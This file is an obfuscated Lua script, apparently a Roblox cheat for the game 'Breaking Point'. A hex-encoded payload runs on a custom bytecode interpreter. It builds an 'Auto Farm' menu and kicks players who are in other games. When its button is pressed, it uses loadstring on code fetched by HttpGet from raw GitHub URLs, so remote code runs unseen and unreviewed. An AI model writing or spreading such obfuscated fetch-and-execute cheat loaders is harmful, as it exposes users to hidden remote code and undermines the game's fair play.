--[[
no comments-
--]]

do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 1;
		local v19;
		v16 = v4(v3(v16, 5), "..", function(v30)
			if (v1(v30, 2) == 79) then
				v19 = v0(v3(v30, 1, 1));
				return "";
			else
				local v68 = 0;
				local v69;
				while true do
					if (v68 == 0) then
						v69 = v2(v0(v30, 16));
						if v19 then
							local v92 = v5(v69, v19);
							v19 = nil;
							return v92;
						else
							return v69;
						end
						break;
					end
				end
			end
		end);
		local function v20(v31, v32, v33)
			if v33 then
				local v70 = (v31 / ((5 - 3) ^ (v32 - 1))) % ((5 - 3) ^ (((v33 - ((1 + 0) - 0)) - (v32 - ((1 + 1) - 1))) + (620 - (555 + 64))));
				return v70 - (v70 % (932 - (857 + 74)));
			else
				local v71 = 2 ^ (v32 - (569 - (367 + 201)));
				return (((v31 % (v71 + v71)) >= v71) and ((1805 - (282 + 595)) - ((1851 - (1523 + 114)) + 713))) or 0;
			end
		end
		local function v21()
			local v34 = v1(v16, v18, v18);
			v18 = v18 + 1;
			return v34;
		end
		local function v22()
			local v35, v36 = v1(v16, v18, v18 + 2 + 0);
			v18 = v18 + 2;
			return (v36 * (364 - 108)) + v35;
		end
		local function v23()
			local v37 = (1954 - 889) - (68 + 997);
			local v38;
			local v39;
			local v40;
			local v41;
			while true do
				if (v37 == (1271 - (226 + 1044))) then
					return (v41 * (73054774 - (56277908 - (87 + 263)))) + (v40 * (65653 - (32 + 85))) + (v39 * (251 + 5)) + v38;
				end
				if (v37 == (0 + (180 - (67 + 113)))) then
					v38, v39, v40, v41 = v1(v16, v18, v18 + ((704 + 256) - (892 + 65)));
					v18 = v18 + (9 - 5);
					v37 = 1 - 0;
				end
			end
		end
		local function v24()
			local v42 = v23();
			local v43 = v23();
			local v44 = 2 - 1;
			local v45 = (v20(v43, (792 - (368 + 423)) + 0, 79 - 59) * (((3669 - 2715) - (802 + (471 - 321))) ^ (85 - 53))) + v42;
			local v46 = v20(v43, 37 - 16, 23 + 8);
			local v47 = ((v20(v43, 1029 - (915 + 82)) == 1) and -1) or 1;
			if (v46 == (0 - 0)) then
				if (v45 == (0 + 0)) then
					return v47 * (0 - 0);
				else
					v46 = 1188 - (1069 + (136 - (10 + 8)));
					v44 = 442 - (416 + 26);
				end
			elseif (v46 == (4643 - 2596)) then
				return ((v45 == ((0 - 0) - 0)) and (v47 * ((1 + 0) / 0))) or (v47 * NaN);
			end
			return v8(v47, v46 - (178 + 845)) * (v44 + (v45 / ((3 - 1) ^ (52 + (0 - 0)))));
		end
		local function v25(v48)
			local v49;
			if not v48 then
				v48 = v23();
				if (v48 == (438 - (145 + 94 + 199))) then
					return "";
				end
			end
			v49 = v3(v16, v18, (v18 + v48) - ((353 + 78) - (44 + 386)));
			v18 = v18 + v48;
			local v50 = {};
			for v66 = 1487 - ((1770 - (201 + 571)) + 488), #v49 do
				v50[v66] = v2(v1(v3(v49, v66, v66)));
			end
			return v6(v50);
		end
		local v26 = v23;
		local function v27(...)
			return {...}, v12("#", ...);
		end
		local function v28()
			local v51 = 374 - (123 + 251);
			local v52;
			local v53;
			local v54;
			local v55;
			local v56;
			local v57;
			local v58;
			while true do
				if (v51 ~= (9 - 7)) then
				else
					v56 = nil;
					v57 = nil;
					v51 = 701 - (208 + 490);
				end
				if (3 ~= v51) then
				else
					v58 = nil;
					while true do
						local v75 = 0;
						while true do
							if (v75 ~= (0 + 0)) then
							else
								if (v52 ~= (0 + 0)) then
								else
									local v99 = 836 - (660 + 176);
									local v100;
									while true do
										if (v99 == 0) then
											v100 = 0;
											while true do
												if (v100 ~= (1 + 1)) then
												else
													v52 = 203 - (14 + 188);
													break;
												end
												if (1 ~= v100) then
												else
													local v114 = 0;
													while true do
														if (v114 ~= 0) then
														else
															v55 = {};
															v56 = {v53,v54,nil,v55};
															v114 = 1 + 0;
														end
														if (v114 == 1) then
															v100 = 3 - 1;
															break;
														end
													end
												end
												if (v100 ~= 0) then
												else
													v53 = {};
													v54 = {};
													v100 = 1;
												end
											end
											break;
										end
									end
								end
								if (v52 == 2) then
									local v101 = 0;
									while true do
										if (v101 == 0) then
											for v108 = 1, v23() do
												local v109 = 0 - 0;
												local v110;
												local v111;
												while true do
													if (v109 ~= (0 - 0)) then
													else
														local v115 = 0;
														while true do
															if (v115 ~= (1 + 0)) then
															else
																v109 = 1;
																break;
															end
															if (v115 == 0) then
																v110 = 0 + 0;
																v111 = nil;
																v115 = 1;
															end
														end
													end
													if (v109 == (397 - (115 + 281))) then
														while true do
															if (v110 == (0 - 0)) then
																v111 = v21();
																if (v20(v111, 1, 1 + 0) == (0 - 0)) then
																	local v190 = 0 - 0;
																	local v191;
																	local v192;
																	local v193;
																	local v194;
																	local v195;
																	while true do
																		if (v190 ~= 2) then
																		else
																			v195 = nil;
																			while true do
																				if (v191 ~= 2) then
																				else
																					while true do
																						if (v192 ~= (867 - (550 + 317))) then
																						else
																							local v213 = 0;
																							local v214;
																							while true do
																								if (0 == v213) then
																									v214 = 0 - 0;
																									while true do
																										if (v214 ~= (0 - 0)) then
																										else
																											local v226 = 0 - 0;
																											while true do
																												if (v226 == 1) then
																													v214 = 1;
																													break;
																												end
																												if (v226 ~= 0) then
																												else
																													v193 = v20(v111, 2, 288 - (134 + 151));
																													v194 = v20(v111, 4, 6);
																													v226 = 1666 - (970 + 695);
																												end
																											end
																										end
																										if (v214 == (1 - 0)) then
																											v192 = 1;
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																						if (v192 ~= (1992 - (582 + 1408))) then
																						else
																							local v215 = 0 - 0;
																							while true do
																								if (v215 ~= 1) then
																								else
																									v192 = 3;
																									break;
																								end
																								if (v215 ~= (0 - 0)) then
																								else
																									if (v20(v194, 3 - 2, 1825 - (1195 + 629)) == (1 - 0)) then
																										v195[243 - (187 + 54)] = v58[v195[782 - (162 + 618)]];
																									end
																									if (v20(v194, 2, 2) == 1) then
																										v195[3] = v58[v195[3]];
																									end
																									v215 = 1;
																								end
																							end
																						end
																						if (v192 ~= 3) then
																						else
																							if (v20(v194, 3, 3 + 0) == 1) then
																								v195[3 + 1] = v58[v195[8 - 4]];
																							end
																							v53[v108] = v195;
																							break;
																						end
																						if (v192 == 1) then
																							local v217 = 0;
																							while true do
																								if ((1 - 0) == v217) then
																									v192 = 1 + 1;
																									break;
																								end
																								if (v217 ~= (1636 - (1373 + 263))) then
																								else
																									v195 = {v22(),v22(),nil,nil};
																									if (v193 == 0) then
																										local v224 = 0 - 0;
																										local v225;
																										while true do
																											if (v224 ~= 0) then
																											else
																												v225 = 1384 - (746 + 638);
																												while true do
																													if (v225 == 0) then
																														v195[3] = v22();
																														v195[2 + 2] = v22();
																														break;
																													end
																												end
																												break;
																											end
																										end
																									elseif (v193 == (1 - 0)) then
																										v195[344 - (218 + 123)] = v23();
																									elseif (v193 == 2) then
																										v195[3] = v23() - ((1583 - (1535 + 46)) ^ 16);
																									elseif (v193 ~= 3) then
																									else
																										local v231 = 0;
																										local v232;
																										while true do
																											if (v231 == (0 + 0)) then
																												v232 = 0;
																												while true do
																													if ((0 + 0) ~= v232) then
																													else
																														v195[563 - (306 + 254)] = v23() - (2 ^ 16);
																														v195[4] = v22();
																														break;
																													end
																												end
																												break;
																											end
																										end
																									end
																									v217 = 1;
																								end
																							end
																						end
																					end
																					break;
																				end
																				if ((0 + 0) ~= v191) then
																				else
																					v192 = 0;
																					v193 = nil;
																					v191 = 1 - 0;
																				end
																				if (v191 ~= (1468 - (899 + 568))) then
																				else
																					local v212 = 0 + 0;
																					while true do
																						if (v212 == 0) then
																							v194 = nil;
																							v195 = nil;
																							v212 = 1;
																						end
																						if (v212 ~= (2 - 1)) then
																						else
																							v191 = 605 - (268 + 335);
																							break;
																						end
																					end
																				end
																			end
																			break;
																		end
																		if (v190 ~= (291 - (60 + 230))) then
																		else
																			v193 = nil;
																			v194 = nil;
																			v190 = 2;
																		end
																		if (v190 == (572 - (426 + 146))) then
																			v191 = 0;
																			v192 = nil;
																			v190 = 1 + 0;
																		end
																	end
																end
																break;
															end
														end
														break;
													end
												end
											end
											for v112 = 1457 - (282 + 1174), v23() do
												v54[v112 - 1] = v28();
											end
											v101 = 812 - (569 + 242);
										end
										if (v101 ~= 1) then
										else
											return v56;
										end
									end
								end
								v75 = 1;
							end
							if (v75 == 1) then
								if (v52 ~= (2 - 1)) then
								else
									v57 = v23();
									v58 = {};
									for v103 = 1, v57 do
										local v104 = 0 + 0;
										local v105;
										local v106;
										local v107;
										while true do
											if (v104 ~= (1024 - (706 + 318))) then
											else
												v105 = 1251 - (721 + 530);
												v106 = nil;
												v104 = 1272 - (945 + 326);
											end
											if (1 == v104) then
												v107 = nil;
												while true do
													if (v105 ~= (0 - 0)) then
													else
														local v116 = 0;
														while true do
															if (v116 ~= (0 + 0)) then
															else
																v106 = v21();
																v107 = nil;
																v116 = 701 - (271 + 429);
															end
															if (v116 == (1 + 0)) then
																v105 = 1501 - (1408 + 92);
																break;
															end
														end
													end
													if (v105 ~= (1087 - (461 + 625))) then
													else
														if (v106 == 1) then
															v107 = v21() ~= (1288 - (993 + 295));
														elseif (v106 == (1 + 1)) then
															v107 = v24();
														elseif (v106 == (1174 - (418 + 753))) then
															v107 = v25();
														end
														v58[v103] = v107;
														break;
													end
												end
												break;
											end
										end
									end
									v56[3] = v21();
									v52 = 1 + 1;
								end
								break;
							end
						end
					end
					break;
				end
				if (v51 == (0 + 0)) then
					v52 = 0;
					v53 = nil;
					v51 = 1 + 0;
				end
				if (v51 ~= (1 + 0)) then
				else
					v54 = nil;
					v55 = nil;
					v51 = 2;
				end
			end
		end
		local function v29(v59, v60, v61)
			local v62 = 0;
			local v63;
			local v64;
			local v65;
			while true do
				if (v62 == 0) then
					v63 = v59[1];
					v64 = v59[2];
					v62 = 1;
				end
				if (v62 == 1) then
					v65 = v59[3];
					return function(...)
						local v76 = v63;
						local v77 = v64;
						local v78 = v65;
						local v79 = v27;
						local v80 = 1;
						local v81 = -1;
						local v82 = {};
						local v83 = {...};
						local v84 = v12("#", ...) - 1;
						local v85 = {};
						local v86 = {};
						for v90 = 0, v84 do
							if (v90 >= v78) then
								v82[v90 - v78] = v83[v90 + 1];
							else
								v86[v90] = v83[v90 + 1];
							end
						end
						local v87 = (v84 - v78) + 1;
						local v88;
						local v89;
						while true do
							local v91 = 0;
							while true do
								if (v91 == 0) then
									v88 = v76[v80];
									v89 = v88[1];
									v91 = 1;
								end
								if (v91 == 1) then
									if (v89 <= 20) then
										if (v89 <= 9) then
											if (v89 <= 4) then
												if (v89 <= 1) then
													if (v89 > 0) then
														v86[v88[2]] = v29(v77[v88[3]], nil, v61);
													else
														local v119 = v88[2];
														local v120, v121 = v79(v86[v119](v13(v86, v119 + 1, v88[3])));
														v81 = (v121 + v119) - 1;
														local v122 = 0;
														for v149 = v119, v81 do
															v122 = v122 + 1;
															v86[v149] = v120[v122];
														end
													end
												elseif (v89 <= 2) then
													local v123 = 0;
													local v124;
													while true do
														if (0 == v123) then
															v124 = v88[2];
															v86[v124] = v86[v124](v13(v86, v124 + 1, v81));
															break;
														end
													end
												elseif (v89 == 3) then
													v86[v88[2]][v88[3]] = v88[4];
												else
													v86[v88[2]] = v86[v88[3]];
												end
											elseif (v89 <= 6) then
												if (v89 == 5) then
													v86[v88[2]]();
												else
													do
														return;
													end
												end
											elseif (v89 <= 7) then
												local v125 = 0;
												local v126;
												local v127;
												while true do
													if (v125 == 0) then
														v126 = v88[2];
														v127 = v86[v88[3]];
														v125 = 1;
													end
													if (v125 == 1) then
														v86[v126 + 1] = v127;
														v86[v126] = v127[v88[4]];
														break;
													end
												end
											elseif (v89 == 8) then
												local v160 = v88[2];
												v86[v160] = v86[v160]();
											else
												local v162 = v88[2];
												v86[v162](v13(v86, v162 + 1, v88[3]));
											end
										elseif (v89 <= 14) then
											if (v89 <= 11) then
												if (v89 == 10) then
													local v128 = v88[2];
													v86[v128] = v86[v128](v13(v86, v128 + 1, v81));
												else
													v86[v88[2]][v88[3]] = v88[4];
												end
											elseif (v89 <= 12) then
												v86[v88[2]] = v29(v77[v88[3]], nil, v61);
											elseif (v89 == 13) then
												v86[v88[2]] = v61[v88[3]];
											else
												local v165 = v88[2];
												v86[v165] = v86[v165](v86[v165 + 1]);
											end
										elseif (v89 <= 17) then
											if (v89 <= 15) then
												local v133 = v88[2];
												local v134 = v86[v88[3]];
												v86[v133 + 1] = v134;
												v86[v133] = v134[v88[4]];
											elseif (v89 > 16) then
												v86[v88[2]] = v86[v88[3]];
											else
												local v169 = v88[2];
												v86[v169] = v86[v169](v86[v169 + 1]);
											end
										elseif (v89 <= 18) then
											v86[v88[2]] = v86[v88[3]][v88[4]];
										elseif (v89 == 19) then
											for v203 = v88[2], v88[3] do
												v86[v203] = nil;
											end
										else
											local v171 = v88[2];
											v86[v171] = v86[v171](v13(v86, v171 + 1, v88[3]));
										end
									elseif (v89 <= 30) then
										if (v89 <= 25) then
											if (v89 <= 22) then
												if (v89 > 21) then
													v86[v88[2]]();
												elseif (v88[2] == v86[v88[4]]) then
													v80 = v80 + 1;
												else
													v80 = v88[3];
												end
											elseif (v89 <= 23) then
												if (v86[v88[2]] == v88[4]) then
													v80 = v80 + 1;
												else
													v80 = v88[3];
												end
											elseif (v89 == 24) then
												v86[v88[2]] = v86[v88[3]][v88[4]];
											else
												v86[v88[2]] = v88[3];
											end
										elseif (v89 <= 27) then
											if (v89 == 26) then
												v86[v88[2]] = v61[v88[3]];
											elseif (v86[v88[2]] == v88[4]) then
												v80 = v80 + 1;
											else
												v80 = v88[3];
											end
										elseif (v89 <= 28) then
											do
												return;
											end
										elseif (v89 > 29) then
											local v180 = 0;
											local v181;
											while true do
												if (0 == v180) then
													v181 = v88[2];
													v86[v181](v86[v181 + 1]);
													break;
												end
											end
										else
											local v182 = 0;
											local v183;
											while true do
												if (v182 == 0) then
													v183 = v88[2];
													v86[v183] = v86[v183]();
													break;
												end
											end
										end
									elseif (v89 <= 35) then
										if (v89 <= 32) then
											if (v89 == 31) then
												local v142 = v88[2];
												local v143, v144 = v79(v86[v142](v13(v86, v142 + 1, v88[3])));
												v81 = (v144 + v142) - 1;
												local v145 = 0;
												for v152 = v142, v81 do
													local v153 = 0;
													while true do
														if (0 == v153) then
															v145 = v145 + 1;
															v86[v152] = v143[v145];
															break;
														end
													end
												end
											elseif v86[v88[2]] then
												v80 = v80 + 1;
											else
												v80 = v88[3];
											end
										elseif (v89 <= 33) then
											local v146 = v88[2];
											v86[v146](v86[v146 + 1]);
										elseif (v89 == 34) then
											if v86[v88[2]] then
												v80 = v80 + 1;
											else
												v80 = v88[3];
											end
										elseif (v88[2] == v86[v88[4]]) then
											v80 = v80 + 1;
										else
											v80 = v88[3];
										end
									elseif (v89 <= 38) then
										if (v89 <= 36) then
											for v154 = v88[2], v88[3] do
												v86[v154] = nil;
											end
										elseif (v89 > 37) then
											local v185 = v88[2];
											v86[v185](v13(v86, v185 + 1, v88[3]));
										else
											v80 = v88[3];
										end
									elseif (v89 <= 39) then
										v86[v88[2]] = v88[3];
									elseif (v89 > 40) then
										local v187 = v88[2];
										v86[v187] = v86[v187](v13(v86, v187 + 1, v88[3]));
									else
										v80 = v88[3];
									end
									v80 = v80 + 1;
									break;
								end
							end
						end
					end;
				end
			end
		end
		return v29(v28(), {}, v17)(...);
	end
	v15("LOL!1C3O00028O00026O00F03F027O004003093O004372656174654C696203133O006E696B7A2330322O352773207363726970747303083O00524A5468656D653803063O004E6577546162030E3O00427265616B696E6720506F696E74026O00084003043O007761697403043O0067616D6503083O0049734C6F61646564030A3O004E657753656374696F6E03093O004175746F204661726D03093O004E657742752O746F6E03183O00436C69636B20746F20746F2O676C652028312074696D6529030A3O0042752O746F6E496E666F03073O00506C6163654964022O00800D9D52C34103053O007072696E74030D3O00636865636B696E672067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004B69636B03213O00546869732073637269707420697320666F7220427265616B696E6720506F696E74030A3O006C6F6164737472696E6703073O00482O747047657403513O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F526F626F6A696E692F547574757269616C5F55495F4C6962726172792F6D61696E2F55495F54656D706C6174655F3100573O0012193O00014O0024000100053O0026173O0006000100020004283O000600012O0024000300043O0012193O00033O0026173O0050000100030004283O005000012O0024000500053O00261700010015000100030004283O00150001002012000600020004001219000700053O001219000800064O00140006000800022O0011000300063O002007000600030007001219000800084O00140006000800022O0011000400063O001219000100093O00261700010029000100010004283O00290001001219000600013O00261700060024000100010004283O0024000100121A0007000A4O000500070001000100121A0007000B3O00200700070007000C2O00100007000200020006200007001A00013O0004283O001A000100121A0007000A4O0005000700010001001219000600023O000E1500020018000100060004283O00180001001219000100023O0004283O002900010004283O0018000100261700010035000100090004283O0035000100200700060004000D0012190008000E4O00140006000800022O0011000500063O00200700060005000F001219000800103O001219000900113O000201000A6O00090006000A00010004283O0056000100261700010009000100020004283O0009000100121A0006000B3O0020120006000600120026170006003F000100130004283O003F000100121A000600143O001219000700154O00210006000200010004283O0045000100121A0006000B3O002012000600060016002012000600060017002007000600060018001219000800194O000900060008000100121A0006001A3O00121A0007000B3O00200700070007001B0012190009001C6O000700094O000200063O00022O00080006000100022O0011000200063O001219000100033O0004283O000900010004283O005600010026173O0002000100010004283O00020001001219000100014O0024000200023O0012193O00023O0004283O000200012O001C3O00013O00013O000B3O00028O00026O00F03F03073O0067657467656E7603083O004175746F4661726D2O0103023O005F4703113O00537465616C50726F746563745374617465030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403493O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6E31717877652F627265616B696E675F706F696E742F6D61696E2F6175746F6661726D2E6C756100233O0012193O00014O0024000100013O0026173O0002000100010004283O00020001001219000100013O00261700010015000100010004283O00150001001219000200013O0026170002000C000100020004283O000C0001001219000100023O0004283O00150001000E1500010008000100020004283O0008000100121A000300034O000800030001000200300B00030004000500121A000300063O00300B000300070005001219000200023O0004283O0008000100261700010005000100020004283O0005000100121A000200083O00121A000300093O00200700030003000A0012190005000B6O000300054O000200023O00022O00050002000100010004283O002200010004283O000500010004283O002200010004283O000200012O001C3O00017O00", v9(), ...);
end
